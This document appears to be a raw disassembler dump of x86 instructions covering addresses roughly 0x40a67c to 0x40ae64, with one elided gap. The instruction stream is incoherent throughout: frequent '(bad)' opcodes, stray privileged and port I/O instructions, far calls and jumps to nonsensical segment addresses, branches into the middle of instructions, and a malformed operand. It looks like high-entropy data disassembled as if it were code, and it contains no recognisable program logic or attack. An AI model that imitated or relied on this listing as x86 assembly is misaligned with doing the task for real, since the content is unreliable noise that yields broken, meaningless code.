  40a67c:	push   ds
  40a67d:	jp     0x40a6a4
  40a67f:	repz into 
  40a681:	push   es
  40a682:	mov    ah,0x25
  40a684:	inc    ebp
  40a685:	push   edx
  40a686:	push   edi
  40a687:	fmul   st(0),st
  40a689:	es loop 0x40a650
  40a68c:	(bad)  
  40a68d:	aas    
  40a68e:	jge    0x40a702
  40a690:	xlat   BYTE PTR ds:[ebx]
  40a691:	gs jno 0x40a6e3
  40a694:	imul   esi,DWORD PTR [esi+0x3c98be71],0x66
  40a69b:	imul   edx,DWORD PTR [ebp-0x9],0x14
  40a69f:	mov    eax,ds:0x24ab0ff
  40a6a4:	and    ah,BYTE PTR [eax-0x61]
  40a6a7:	push   ebx
  40a6a8:	sbb    BYTE PTR [esi+0x64],dl
  40a6ab:	sti    
  40a6ac:	adc    ebp,0xe879b4ac
  40a6b2:	or     DWORD PTR [esi+0x7c380d2d],eax
  40a6b8:	or     eax,0xd10ae397
  40a6bd:	(bad)  
  40a6be:	mov    edi,0x55699502
  40a6c3:	adc    ecx,DWORD PTR [ebx]
  40a6c5:	shl    DWORD PTR [esi],0x49
  40a6c8:	adc    al,0xf0
  40a6ca:	pop    ebp
  40a6cb:	rol    edi,cl
  40a6cd:	cli    
  40a6ce:	push   0x5d1bc5ed
  40a6d3:	sbb    dl,dl
  40a6d5:	repnz pop edx
  40a6d7:	and    eax,0x7e068540
  40a6dc:	ret    0x4753
  40a6df:	dec    ecx
  40a6e0:	xor    ebp,DWORD PTR [ebp+0x38]
  40a6e3:	jne    0x40a6e3
  40a6e5:	sbb    eax,0xc8f6a85
  40a6ea:	add    eax,0x71d5c016
  40a6ef:	fs xchg ebp,eax
  40a6f1:	out    dx,eax
  40a6f2:	sub    ch,0xa1
  40a6f5:	test   al,0x59
  40a6f7:	inc    esp
  40a6f8:	fidiv  DWORD PTR [ebx-0x80]
  40a6fb:	ret    
  40a6fc:	shl    DWORD PTR [esi+0x47],cl
  40a6ff:	xlat   BYTE PTR ds:[ebx]
  40a700:	jae    0x40a762
  40a702:	lea    edi,[esi+0x473bbda4]
  40a708:	test   DWORD PTR ds:0x59cc3ed7,esp
  40a70e:	repnz mov ah,0x82
  40a711:	sub    DWORD PTR [eax-0x61],0xfe42e96b
  40a718:	call   0xea35500c
  40a71d:	fist   DWORD PTR [esi+0x6f65be23]
  40a723:	adc    ah,BYTE PTR [esi]
  40a725:	bound  edi,QWORD PTR [edi]
  40a727:	sub    BYTE PTR [esi-0x4879dd21],bh
  40a72d:	pop    esi
  40a72e:	adc    eax,0xd713d431
  40a733:	pop    ecx
  40a734:	cli    
  40a735:	adc    BYTE PTR [ebx],ch
  40a737:	mov    eax,0x44150f76
  40a73c:	xor    eax,0x652d0b37
  40a741:	ss pop ss
  40a743:	call   0x1fb1:0xa285fcd5
  40a74a:	ret    0x980a
  40a74d:	jl     0x40a6d6
  40a74f:	cs mov ah,0x95
  40a752:	imul   eax,DWORD PTR [ecx],0x9a30b4fb
  40a758:	aam    0x5d
  40a75a:	mov    bl,0x59
  40a75c:	pop    esi
  40a75d:	jmp    0x40a6fb
  40a75f:	and    DWORD PTR ds:0xfff3f183,ebp
  40a765:	cmp    ebp,DWORD PTR [edi]
  40a767:	ror    BYTE PTR [ebp-0x2fb36e3f],1
  40a76d:	push   0x36
  40a76f:	xor    al,0x3
  40a771:	mov    esi,DWORD PTR ds:0xb0b77f98
  40a777:	fimul  WORD PTR [eax-0x69b5a1c7]
  40a77d:	repz xchg edx,eax
  40a77f:	imul   esp,DWORD PTR [ebp-0x13bac45a],0xffffffe6
  40a786:	das    
  40a787:	mov    ds:0xf424e17c,al
  40a78c:	mov    dl,0x77
  40a78e:	pop    ebp
  40a78f:	xchg   edx,eax
  40a790:	inc    esi
  40a791:	mov    BYTE PTR [ebx+0x6797660e],0x83
  40a798:	arpl   WORD PTR [eax-0x24cbd7ce],dx
  40a79e:	sbb    BYTE PTR [edi],0xf2
  40a7a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7a2:	call   0xdaf13bbb
  40a7a7:	mov    eax,0xea2de58f
  40a7ac:	inc    ebp
  40a7ad:	popf   
  40a7ae:	loope  0x40a77f
  40a7b0:	out    0xd8,al
  40a7b2:	cwde   
  40a7b3:	lods   eax,DWORD PTR ds:[esi]
  40a7b4:	inc    esp
  40a7b5:	repz jmp 0x40a82a
  40a7b8:	in     al,0xe9
  40a7ba:	stc    
  40a7bb:	cdq    
  40a7bc:	stc    
  40a7bd:	jge    0x40a800
  40a7bf:	dec    ecx
  40a7c0:	cmc    
  40a7c1:	sub    edi,DWORD PTR [edi+0x312e86a4]
  40a7c7:	mov    ebx,0x150df53b
  40a7cc:	imul   ebx,DWORD PTR [ecx+0x51e4f4d2],0xffffffd2
  40a7d3:	adc    DWORD PTR [bp+di+0x10],eax
  40a7d7:	addr16 repz cmc 
  40a7da:	adc    cl,BYTE PTR [ebx]
  40a7dc:	jbe    0x40a7ec
  40a7de:	addr16 in eax,dx
  40a7e0:	mov    eax,ds:0x522d6b39
  40a7e6:	sbb    edx,eax
  40a7e8:	add    ebx,ecx
  40a7ea:	retf   
  40a7eb:	loop   0x40a827
  40a7ed:	dec    edi
  40a7ee:	aaa    
  40a7ef:	cmp    esp,edx
  40a7f1:	js     0x40a7dd
  40a7f3:	scas   eax,DWORD PTR es:[edi]
  40a7f4:	test   BYTE PTR [ebx-0x27],ah
  40a7f7:	and    edi,DWORD PTR [eax]
  40a7f9:	lahf   
  40a7fa:	sti    
  40a7fb:	xchg   BYTE PTR [edx+eiz*4+0x4e],dl
  40a7ff:	cmp    DWORD PTR gs:0x23f18773,esi
  40a806:	add    BYTE PTR [ebx+ebp*2],al
  40a809:	call   0x1c7:0xe56d921c
  40a810:	pop    edi
  40a811:	jns    0x40a833
  40a813:	das    
  40a814:	mov    dh,0x28
  40a816:	xchg   esp,eax
  40a817:	mov    cl,BYTE PTR [ecx]
  40a819:	inc    edx
  40a81a:	data16 lahf 
  40a81c:	sahf   
  40a81d:	clc    
  40a81e:	outs   dx,BYTE PTR ds:[esi]
  40a81f:	dec    ebx
  40a820:	jns    0x40a854
  40a822:	into   
  40a823:	lds    esi,FWORD PTR [esi]
  40a825:	push   esi
  40a826:	jg     0x40a823
  40a828:	mov    ebp,0x5a5a7122
  40a82d:	loopne 0x40a82e
  40a82f:	jge    0x40a839
  40a831:	(bad)  
  40a832:	cmp    edi,DWORD PTR [edi-0x7528e7e2]
  40a838:	fcomp  QWORD PTR [edi+0x3c]
  40a83b:	bound  ecx,QWORD PTR [ebp-0x422122c1]
  40a841:	outs   dx,DWORD PTR ds:[esi]
  40a842:	xchg   ebp,eax
  40a843:	pop    edi
  40a844:	or     eax,0x3a198ce4
  40a849:	or     dh,BYTE PTR [edi]
  40a84b:	fidivr DWORD PTR [eax]
  40a84d:	ret    
  40a84e:	jne    0x40a883
  40a850:	aaa    
  40a851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a852:	pop    ss
  40a853:	xor    eax,DWORD PTR [ecx+0x5cbae3fc]
  40a859:	sbb    eax,0xec80f9d7
  40a85e:	mov    al,0xa
  40a860:	mov    cl,0xd3
  40a862:	xchg   edx,eax
  40a863:	jl     0x40a81e
  40a865:	dec    esp
  40a866:	mov    al,ds:0xd7db13a4
  40a86b:	dec    ecx
  40a86c:	jmp    0x8f77:0x1e329618
  40a873:	mov    DWORD PTR [edi+0x654d91f],ebp
  40a879:	pop    edi
  40a87a:	test   BYTE PTR [ebx],ah
  40a87c:	pop    edx
  40a87d:	inc    edx
  40a87e:	cwde   
  40a87f:	jns    0x40a83b
  40a881:	sub    eax,ebx
  40a883:	ret    
  40a884:	mov    ecx,0x2d33d5ca
  40a889:	pop    esi
  40a88a:	adc    edx,edx
  40a88c:	test   eax,0x80a3be4b
  40a891:	pop    ss
  40a892:	mov    bh,0x68
  40a894:	push   ecx
  40a895:	mov    dl,0x3a
  40a897:	cmp    bl,BYTE PTR [ebp-0xc0c6938]
  40a89d:	cmp    bh,ah
  40a89f:	rcr    esi,1
  40a8a1:	cmp    ch,BYTE PTR [ebp+0x10fd91ac]
  40a8a7:	jae    0x40a8d2
  40a8a9:	dec    di
  40a8ab:	mov    edi,0x48d66798
  40a8b0:	cld    
  40a8b1:	add    edx,edi
  40a8b3:	and    eax,0x31fb47f6
  40a8b8:	in     al,0xba
  40a8ba:	es mov al,0xe8
  40a8bd:	sahf   
  40a8be:	xlat   BYTE PTR ds:[ebx]
  40a8bf:	xchg   BYTE PTR [ebx-0x80],bh
  40a8c2:	xor    eax,DWORD PTR [edx+ebx*4]
  40a8c5:	neg    ebx
  40a8c7:	je     0x40a939
  40a8c9:	and    dl,0x63
  40a8cc:	or     bh,BYTE PTR ds:0xfeed9a6d
  40a8d2:	mov    eax,ebx
  40a8d4:	xor    al,0xc4
  40a8d6:	(bad)  
  40a8d8:	aam    0xdb
  40a8da:	sub    al,0x4f
  40a8dd:	ins    DWORD PTR es:[edi],dx
  40a8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8df:	lock clc 
  40a8e1:	sub    esi,DWORD PTR [ebx-0x6b278782]
  40a8e7:	xchg   edx,eax
  40a8e8:	fist   WORD PTR [eax+edx*4+0x4f]
  40a8ec:	hlt    
  40a8ed:	shl    BYTE PTR [ebx],0x5d
  40a8f0:	fadd   QWORD PTR ds:0xd8759812
  40a8f6:	fs sub eax,0xeeb73c30
  40a8fc:	std    
  40a8fd:	add    esp,DWORD PTR [ebx-0x7e]
  40a900:	push   ss
  40a901:	fwait
  40a902:	or     ebp,DWORD PTR [esi]
  40a904:	fidiv  DWORD PTR fs:[ebx]
  40a907:	cmp    DWORD PTR [eax+0x6a4ddbbb],edi
  40a90d:	sbb    edx,DWORD PTR ds:0x3bd04712
  40a913:	dec    esp
  40a914:	sub    bl,bh
  40a916:	hlt    
  40a917:	push   ebx
  40a918:	push   ss
  40a919:	mov    dh,0xb8
  40a91b:	pop    esi
  40a91c:	or     BYTE PTR [ebx+0x32],dh
  40a91f:	mov    edi,eax
  40a921:	or     dh,BYTE PTR [edi-0x68fd0b29]
  40a927:	pop    edi
  40a928:	dec    esi
  40a929:	neg    dl
  40a92b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a92c:	adc    eax,0x28c5d005
  40a931:	cli    
  40a932:	mov    esi,0xae987fad
  40a937:	stos   DWORD PTR es:[edi],eax
  40a938:	mov    al,ds:0x8fd92786
  40a93d:	mov    ebx,0x4d98cced
  40a942:	mov    esp,0xaf66e171
  40a947:	jmp    0x40a942
  40a949:	jns    0x40a928
  40a94b:	xchg   ebp,eax
  40a94c:	xchg   BYTE PTR [eax-0x2f],al
  40a94f:	jbe    0x40a9ab
  40a951:	add    DWORD PTR [esi],0xffffff98
  40a954:	xor    al,0x64
  40a956:	push   eax
  40a957:	gs int3 
  40a959:	pop    eax
  40a95a:	pop    edi
  40a95b:	or     al,0x6
  40a95d:	pop    ebp
  40a95e:	sbb    al,0x3d
  40a960:	sub    eax,0x79f25427
  40a965:	jno    0x40a910
  40a967:	inc    esp
  40a968:	push   ss
  40a969:	mov    bh,al
  40a96b:	es ret 0x12d3
  40a96f:	adc    ecx,0xffffffe2
  40a972:	or     esp,DWORD PTR [edi]
  40a974:	mov    al,0xd4
  40a976:	push   ss
  40a977:	mov    ?,WORD PTR [edx]
  40a979:	hlt    
  40a97a:	cli    
  40a97b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a97c:	dec    esi
  40a97d:	gs mov esp,0x5b0d0e8e
  40a983:	xchg   esp,ecx
  40a985:	mov    ecx,DWORD PTR [edx+0x3f]
  40a988:	fs add bh,BYTE PTR ss:[ebp-0x3226e918]
  40a990:	rcl    BYTE PTR [edi-0x584679e0],cl
  40a996:	into   
  40a997:	ret    0xcf77
  40a99a:	inc    eax
  40a99b:	pop    esi
  40a99c:	push   edi
  40a99d:	sahf   
  40a99e:	push   ecx
  40a99f:	or     cl,0x46
  40a9a2:	imul   edx,DWORD PTR [eax-0x1e77f4ff],0xc999af47
  40a9ac:	ret    
  40a9ad:	cmp    ecx,DWORD PTR [edx+0x54]
  40a9b0:	repz pop esi
  40a9b2:	mov    ds:0xd125248e,al
  40a9b7:	inc    BYTE PTR [edi]
  40a9b9:	jo     0x40a9ce
  40a9bb:	in     eax,0xd
  40a9bd:	call   0x4ac9:0xf96f0d87
  40a9c4:	pop    ebx
  40a9c5:	mov    bh,0xef
  40a9c7:	lock int 0x88
  40a9ca:	in     eax,0x9c
  40a9cc:	xchg   esi,eax
  40a9cd:	rcr    BYTE PTR [ecx+0x6344bee4],0xaa
  40a9d4:	xchg   edi,eax
  40a9d5:	dec    eax
  40a9d6:	xor    DWORD PTR [ebx-0x50],ebx
  40a9d9:	pop    eax
  40a9da:	sbb    al,0x37
  40a9dc:	dec    ecx
  40a9dd:	cmp    al,0xc4
  40a9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e0:	xchg   BYTE PTR [ecx],ch
  40a9e2:	mov    eax,0xc10b30a4
  40a9e7:	(bad)  
  40a9e8:	jmp    0xd3b6:0x1eb95819
  40a9ef:	mov    esi,0xca469cc3
  40a9f4:	call   0xd09a:0xbd9f314a
  40a9fb:	scas   eax,DWORD PTR es:[edi]
  40a9fc:	scas   al,BYTE PTR es:[edi]
  40a9fd:	es jmp 0x29f3:0xee0cb7d4
  40aa05:	inc    esi
  40aa06:	xor    eax,0x77e1bd1c
  40aa0b:	lods   al,BYTE PTR ds:[esi]
  40aa0c:	repnz aad 0xcd
  40aa0f:	xor    BYTE PTR [eax],bh
  40aa11:	ret    0xa57a
  40aa14:	jmp    0x5ff1:0xbb0cbce6
  40aa1b:	cmp    edx,DWORD PTR [edx-0x373509a8]
  40aa21:	adc    BYTE PTR [ecx+0x27],bh
  40aa24:	loopne 0x40aa70
  40aa26:	mov    edx,eax
  40aa28:	and    BYTE PTR [edx],bh
  40aa2a:	inc    ecx
  40aa2b:	mov    ebx,0xf9d6e084
  40aa30:	aas    
  40aa31:	clc    
  40aa32:	fistp  QWORD PTR [edx+0x2]
  40aa35:	sti    
  40aa36:	add    BYTE PTR [ecx],0x28
  40aa39:	sbb    BYTE PTR [esi],al
  40aa3b:	test   DWORD PTR [esp+ebp*8+0x465cdb1e],ebp
  40aa42:	mov    ch,0xd8
  40aa44:	fbld   TBYTE PTR [edi+0x53837513]
  40aa4a:	ret    
  40aa4b:	xlat   BYTE PTR ds:[ebx]
  40aa4c:	dec    ecx
  40aa4d:	imul   eax,ebx,0x4d
  40aa50:	(bad)
  40aa53:	xchg   DWORD PTR [esi-0x289245f0],esi
  40aa59:	dec    edx
  40aa5a:	pop    edx
  40aa5b:	(bad)  
  40aa5c:	cli    
  40aa5d:	push   ecx
  40aa5e:	in     al,dx
  40aa5f:	xchg   DWORD PTR [ebp-0x20],ecx
  40aa62:	inc    ecx
  40aa63:	inc    edx
  40aa64:	fsub   st,st(7)
  40aa66:	ins    DWORD PTR es:[edi],dx
  40aa67:	inc    edx
  40aa68:	dec    esi
  40aa69:	cli    
  40aa6a:	jns    0x40aac0
  40aa6c:	int3   
  40aa6d:	push   esi
  40aa6e:	std    
  40aa6f:	cmp    ebp,DWORD PTR [ebp-0x145c316]
  40aa75:	xchg   edx,eax
  40aa76:	and    bh,ah
  40aa78:	pop    ebx
  40aa79:	(bad)  
  40aa7a:	ss pop ss
  40aa7c:	sbb    eax,ebp
  40aa7e:	mov    bl,0xcc
  40aa80:	scas   al,BYTE PTR es:[edi]
  40aa81:	pop    DWORD PTR [ecx]
  40aa83:	and    bl,cl
  40aa85:	test   bh,ah
  40aa87:	cwde   
  40aa88:	cld    
  40aa89:	mov    ebp,0xd8d6b62
  40aa8e:	fbstp  TBYTE PTR [ebp-0x4f]
  40aa91:	inc    esi
  40aa92:	dec    esp
  40aa93:	dec    esi
  40aa94:	xor    dh,BYTE PTR [edx-0x2f27ebb8]
  40aa9a:	repnz fnsave [eax+0x47d5620b]
  40aaa1:	mov    dl,0xb6
  40aaa3:	jo     0x40aa3c
  40aaa5:	out    0x7f,al
  40aaa7:	lock aas 
  40aaa9:	and    cl,ch
  40aaab:	inc    ecx
  40aaac:	jno    0x40aa5e
  40aaae:	sub    al,0xcc
  40aab0:	bound  ebx,QWORD PTR ds:0xf9aaa7b0
  40aab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aab7:	ins    DWORD PTR es:[edi],dx
  40aab8:	stc    
  40aab9:	(bad)
  40aabe:	sub    al,0x8d
  40aac0:	cmp    al,0xdb
  40aac2:	test   eax,0xab1f1cb9
  40aac7:	push   esi
  40aac8:	add    eax,0xba9fec4c
  40aacd:	and    dl,0xb7
  40aad0:	sbb    al,0x39
  40aad2:	and    eax,0x8fae2efd
  40aad7:	imul   ebp,DWORD PTR [edi],0x27032835
  40aadd:	ror    BYTE PTR [edi],1
  40aadf:	push   esp
  40aae0:	mov    ds:0x9443f496,eax
  40aae5:	jmp    FWORD PTR [edx-0x38]
  40aae8:	adc    dh,BYTE PTR [eax-0xdc201a0]
  40aaee:	xchg   DWORD PTR [esi],esp
  40aaf0:	pop    edi
  40aaf1:	fidiv  WORD PTR [eax+0x72]
  40aaf4:	sub    DWORD PTR [esi-0x9],esi
  40aaf7:	les    esp,FWORD PTR [edi+0x3ac8d90f]
  40aafd:	loop   0x40aa89
  40aaff:	pop    ebx
  40ab00:	mov    cx,WORD PTR es:[edx-0x69362767]
  40ab08:	loope  0x40ab05
  40ab0a:	xchg   edi,eax
  40ab0b:	mov    dh,0x91
  40ab0d:	mov    bh,0x3
  40ab0f:	out    0xb4,eax
  40ab11:	sbb    eax,0xe8c0eb5d
  40ab16:	jb     0x40ab08
  40ab18:	jne    0x40ab13
  40ab1a:	inc    eax
  40ab1b:	pop    ss
  40ab1c:	push   eax
  40ab1d:	push   esi
  40ab1e:	pop    eax
  40ab1f:	loopne 0x40aab5
  40ab21:	pushf  
  40ab22:	neg    DWORD PTR ds:0x86dd24b5
  40ab28:	jmp    0x7f3e:0x1d08e341
  40ab2f:	ds add eax,0x8c0403f3
  40ab35:	loope  0x40ab71
  40ab37:	mov    cl,0xe3
  40ab39:	xor    ch,BYTE PTR [eax+ecx*8-0x268b7e17]
  40ab40:	arpl   WORD PTR [ebx+eax*4+0x2],si
  40ab44:	mov    al,ds:0x899211ca
  40ab49:	iret   
  40ab4a:	pcmpgtd mm0,QWORD PTR [ecx+0x6d]
  40ab4e:	mov    ebp,0x3772b2b3
  40ab53:	sbb    DWORD PTR [edi+0x7185a7ee],edx
  40ab59:	sub    ah,BYTE PTR [ebx]
  40ab5b:	enter  0x78d2,0x18
  40ab5f:	pop    edi
  40ab60:	call   0x6b14:0x6263e96b
  40ab67:	pop    edx
  40ab68:	(bad)  
  40ab69:	xchg   ebx,eax
  40ab6a:	mov    ds:0x5023b43e,eax
  40ab6f:	push   ebx
  40ab70:	and    DWORD PTR [edi-0x7266d38b],edx
  40ab76:	stos   BYTE PTR es:[edi],al
  40ab77:	dec    ebp
  40ab78:	fwait
  40ab79:	xor    dh,BYTE PTR [edx-0x47]
  40ab7c:	loope  0x40ab8a
  40ab7e:	jns    0x40ab40
  40ab80:	iret   
  40ab81:	jmp    FWORD PTR ds:0x2ec3bd4
  40ab87:	mov    bl,0x4f
  40ab89:	repz add eax,0x62daa0ff
  40ab8f:	mov    al,ds:0xfcd5c4a4
  40ab94:	inc    ecx
  40ab95:	jo     0x40abde
  40ab97:	(bad)  
  40ab98:	xchg   edi,eax
  40ab99:	sbb    ch,bh
  40ab9b:	mov    dl,0x86
  40ab9d:	lods   eax,DWORD PTR ds:[esi]
  40ab9e:	push   ss
  40ab9f:	lock les ebx,FWORD PTR [esi-0x37]
  40aba3:	mov    ah,BYTE PTR [esi+esi*2-0x47]
  40aba7:	in     al,0x4b
  40aba9:	push   0x52
  40abab:	sbb    esp,ebp
  40abad:	sub    cl,BYTE PTR [ecx-0x287322d8]
  40abb3:	push   0xdac0d62b
  40abb8:	aaa    
  40abb9:	inc    ebx
  40abba:	pop    eax
  40abbb:	stc    
  40abbc:	pop    ss
  40abbd:	js     0x40ab43
  40abbf:	xor    al,0x5d
  40abc1:	mov    dh,dl
  40abc3:	inc    edx
  40abc4:	jp     0x40abc1
  40abc6:	retf   
  40abc7:	les    ebp,FWORD PTR ds:0xb91dc98
  40abcd:	sahf   
  40abce:	dec    eax
  40abcf:	fs jb  0x40ac3d
  40abd2:	retf   
  40abd3:	xor    ax,0x3c9
  40abd7:	(bad)  
  40abd8:	sbb    cl,BYTE PTR [esi]
  40abda:	retf   
  40abdb:	sub    ebx,DWORD PTR [edx]
  40abdd:	and    eax,0x2fc503a0
  40abe2:	push   es
  40abe3:	xor    edi,DWORD PTR [edx]
  40abe5:	out    dx,al
  40abe6:	pop    ss
  40abe7:	inc    edx
  40abe8:	jbe    0x40ac02
  40abea:	ror    DWORD PTR [esi],cl
  40abec:	pop    edi
  40abed:	arpl   WORD PTR [edi-0x13],sp
  40abf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abf1:	pop    es
  40abf2:	pushf  
  40abf3:	out    dx,eax
  40abf4:	and    eax,esp
  40abf6:	or     al,bl
  40abf8:	jmp    0xbdf2d832
  40abfd:	pop    ebp
  40abfe:	xlat   BYTE PTR ds:[ebx]
  40abff:	pop    edi
  40ac00:	jl     0x40ab9d
  40ac02:	aaa    
  40ac03:	push   edi
  40ac04:	pop    ebx
  40ac05:	mov    al,0x89
  40ac07:	int    0xcc
  40ac09:	adc    edi,eax
  40ac0b:	xrelease xchg DWORD PTR cs:[ebx],ebx
  40ac0f:	mov    ch,0x22
  40ac11:	pop    ecx
  40ac12:	dec    ebx
  40ac13:	adc    ecx,DWORD PTR ds:0x109c0924
  40ac19:	sbb    eax,0x5751a187
  40ac1e:	aas    
  40ac1f:	test   BYTE PTR [ebx],bh
  40ac21:	sub    al,0xc5
  40ac23:	scas   al,BYTE PTR es:[edi]
  40ac24:	xchg   ebp,eax
  40ac25:	pop    es
  40ac26:	out    dx,al
  40ac27:	mov    ah,0xef
  40ac29:	test   eax,0x24e32f09
  40ac2e:	in     eax,dx
  40ac2f:	xchg   DWORD PTR [esi],eax
  40ac31:	fst    QWORD PTR [eax+ebp*2]
  40ac34:	cmp    DWORD PTR [edx+0x653e8d5d],edx
  40ac3a:	cs jmp 0x40ac07
  40ac3d:	pop    ecx
  40ac3e:	fidiv  WORD PTR [edi-0x4d5567df]
  40ac44:	in     eax,0xdf
  40ac46:	aaa    
  40ac47:	rcl    DWORD PTR [eax-0x7],0xec
  40ac4b:	test   al,0x4
  40ac4d:	push   cs
  40ac4e:	sahf   
  40ac4f:	jl     0x40ac3e
  40ac51:	adc    ch,BYTE PTR [esi]
  40ac53:	cmp    ch,BYTE PTR [edi+0x29]
  40ac56:	xchg   edi,eax
  40ac57:	push   ebp
  40ac58:	dec    edi
  40ac59:	in     eax,dx
  40ac5a:	jge    0x40ac35
  40ac5c:	gs aas 
  40ac5e:	outs   dx,BYTE PTR ds:[esi]
  40ac5f:	rcr    esi,cl
  40ac61:	jmp    0x40ac61
  40ac63:	outs   dx,DWORD PTR ds:[esi]
  40ac64:	rol    esp,0x66
  40ac67:	cmp    ebx,esi
  40ac69:	push   ebp
  40ac6a:	add    eax,0x31177048
  40ac6f:	fistp  WORD PTR [edi]
  40ac71:	adc    al,0xdd
  40ac73:	mov    WORD PTR [edx],fs
  40ac75:	mov    al,BYTE PTR [edi]
  40ac77:	cmp    eax,0x8a6f05f1
  40ac7c:	adc    bl,BYTE PTR [esi]
  40ac7e:	pop    ds
  40ac7f:	clc    
  40ac80:	push   ecx
  40ac81:	popa   
  40ac82:	icebp  
  40ac83:	xor    BYTE PTR [edx],al
  40ac85:	xchg   edi,ebx
  40ac87:	js     0x40ac0b
  40ac89:	add    ecx,DWORD PTR [esi-0xf]
  40ac8c:	inc    ebp
  40ac8d:	fsub   DWORD PTR [ecx-0x15]
  40ac90:	stos   DWORD PTR es:[edi],eax
  40ac91:	adc    al,al
  40ac93:	loope  0x40acb9
  40ac95:	push   ebp
  40ac96:	mov    al,ds:0xe6
	...
  40ad13:	add    BYTE PTR [ebx-0x2370a3bd],al
  40ad19:	lahf   
  40ad1a:	ror    DWORD PTR [edi-0x18],cl
  40ad1d:	pushw  0x34
  40ad20:	and    bl,BYTE PTR [ecx-0x3]
  40ad23:	mov    ecx,es
  40ad25:	pop    esi
  40ad26:	add    BYTE PTR [eax],al
  40ad28:	ins    BYTE PTR es:[edi],dx
  40ad29:	pop    es
  40ad2a:	add    BYTE PTR [eax],al
  40ad2c:	fimul  WORD PTR [edx+0x30]
  40ad2f:	adc    ch,cl
  40ad31:	and    edx,DWORD PTR ds:0x6d092cb9
  40ad37:	and    ch,BYTE PTR [ebp+0x19]
  40ad3a:	adc    ecx,DWORD PTR [ebp+edi*4-0x3edf8f51]
  40ad41:	(bad)  [edi]
  40ad43:	jbe    0x40ad68
  40ad45:	inc    edx
  40ad46:	leave  
  40ad47:	pop    eax
  40ad48:	ins    BYTE PTR es:[edi],dx
  40ad49:	jmp    0x40acf1
  40ad4b:	imul   ecx,DWORD PTR [ebp-0x775af77c],0xd
  40ad52:	jmp    0xdf46:0xe39d1fd5
  40ad59:	adc    eax,0x1ab4cd39
  40ad5e:	xchg   ebx,eax
  40ad5f:	lea    ecx,[ebp+0x6e6ad603]
  40ad65:	xchg   BYTE PTR [ebx-0x7d],ch
  40ad68:	(bad)  
  40ad69:	punpcklwd mm2,DWORD PTR [ebx+0x4f]
  40ad6d:	lock xchg ebp,eax
  40ad6f:	in     eax,dx
  40ad70:	xchg   esp,eax
  40ad71:	loope  0x40ad00
  40ad73:	lods   eax,DWORD PTR ds:[esi]
  40ad74:	xlat   BYTE PTR ds:[ebx]
  40ad75:	fdivr  QWORD PTR [ebx]
  40ad77:	(bad)  
  40ad78:	mov    ds:0x1462f4ae,eax
  40ad7d:	cmc    
  40ad7e:	cld    
  40ad7f:	xchg   ebx,eax
  40ad80:	rcr    ecx,1
  40ad82:	mov    bh,0x4b
  40ad84:	and    ch,dh
  40ad86:	test   ebx,ebp
  40ad88:	(bad)  
  40ad89:	cld    
  40ad8a:	sub    al,0x8f
  40ad8c:	div    dl
  40ad8e:	dec    ebp
  40ad8f:	loope  0x40ad6a
  40ad91:	enter  0xfb51,0x59
  40ad95:	scas   al,BYTE PTR es:[edi]
  40ad96:	call   0x3d9a:0x28d9d118
  40ad9d:	or     al,0x58
  40ad9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ada0:	inc    ebx
  40ada1:	aad    0x6d
  40ada3:	jns    0x40ae05
  40ada5:	call   0xc52cae6e
  40adaa:	mov    edx,0xb0a1cec5
  40adaf:	rol    BYTE PTR [edx+0x28e5404a],0x1b
  40adb6:	mov    al,ds:0x6d1563f0
  40adbb:	scas   al,BYTE PTR es:[edi]
  40adbc:	arpl   WORD PTR [edi],bp
  40adbe:	out    dx,al
  40adbf:	bndstx [edi+ebp*1+0x31],(bad)
  40adc4:	jmp    0x40ae1a
  40adc6:	sbb    al,0xba
  40adc8:	mov    ch,0x78
  40adca:	or     DWORD PTR [edi],0xffffffe3
  40adcd:	cmp    eax,0x588f2d6e
  40add2:	mov    ecx,0x3e54ecdb
  40add7:	jg     0x40add5
  40add9:	das    
  40adda:	lods   al,BYTE PTR ds:[esi]
  40addb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40addc:	loop   0x40ae28
  40adde:	xchg   edx,eax
  40addf:	xchg   edi,eax
  40ade0:	popf   
  40ade1:	ja     0x40ad8d
  40ade3:	clc    
  40ade4:	xor    BYTE PTR [eax],cl
  40ade6:	into   
  40ade7:	call   0x6949:0x9a64157a
  40adee:	rol    ch,1
  40adf0:	xchg   DWORD PTR [ecx-0x27],eax
  40adf3:	imul   esi,DWORD PTR [edx],0x18
  40adf6:	cmp    al,0x61
  40adf8:	adc    al,bl
  40adfa:	mov    edi,0xd68f92ba
  40adff:	fldenv [esi*2-0x675fd3dc]
  40ae06:	mov    ch,0xaa
  40ae08:	gs or  al,0x27
  40ae0b:	mov    esp,0x26ffb392
  40ae10:	and    DWORD PTR [ebp+0x7f],ebx
  40ae13:	scas   al,BYTE PTR es:[edi]
  40ae14:	sub    ebx,DWORD PTR [eax]
  40ae16:	out    dx,al
  40ae17:	ins    BYTE PTR es:[edi],dx
  40ae18:	fistp  WORD PTR [eax]
  40ae1a:	xchg   edx,eax
  40ae1b:	call   0xfb:0xf280d68
  40ae22:	or     BYTE PTR [esi],bl
  40ae24:	test   DWORD PTR [edx],0x833f7353
  40ae2a:	xor    bh,BYTE PTR [ecx+0x1d]
  40ae2d:	pusha  
  40ae2e:	mov    esp,0x7a2f652d
  40ae33:	fnstcw WORD PTR [eax+0x7fc81d6e]
  40ae39:	add    ebx,ecx
  40ae3b:	adc    BYTE PTR [ecx-0x1f901298],cl
  40ae41:	mov    edi,0xe6e87efb
  40ae46:	psubusb mm2,mm7
  40ae49:	(bad)  
  40ae4a:	idiv   edi
  40ae4c:	out    0x0,al
  40ae4e:	xlat   BYTE PTR ds:[ebx]
  40ae4f:	shl    eax,1
  40ae51:	call   0xc78ca176
  40ae56:	fld    TBYTE PTR [ebx]
  40ae58:	sbb    ebp,esi
  40ae5a:	outs   dx,BYTE PTR ds:[esi]
  40ae5b:	aas    
  40ae5c:	pop    ecx
  40ae5d:	xchg   esi,eax
  40ae5e:	push   edi
  40ae5f:	out    dx,eax
  40ae60:	fs cli 
  40ae62:	or     BYTE PTR [edx],bh
  40ae64:	fst    DWORD PTR ds:0x6108bdbd
